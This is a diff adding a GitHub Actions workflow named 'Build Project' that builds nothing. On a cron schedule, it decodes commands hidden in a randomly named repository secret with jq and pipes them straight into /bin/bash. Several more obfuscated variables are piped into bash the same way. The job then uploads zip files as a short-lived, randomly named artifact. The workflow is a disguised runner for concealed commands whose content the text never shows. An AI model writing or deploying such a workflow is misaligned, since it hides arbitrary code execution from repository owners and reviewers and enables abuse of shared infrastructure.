@@ -1,0 +1,32 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '1 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          xeaox3771: ${{ secrets.xeaox3771 }}
+        run: |
+          printf '%s' "$xeaox3771" | jq -r .dmsq43238 | /bin/bash
+          printf '%s' "$tjlp52" | jq -r .cda1 | /bin/bash
+          echo $g61 | jq -r .iyfzk993 | /bin/bash
+          echo $w63276 | jq -r .fm77 | /bin/bash
+          printf '%s' "$mcwsh89" | jq -r .o27 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: emmvVNMH
+          path: "*.zip"
+          retention-days: 1
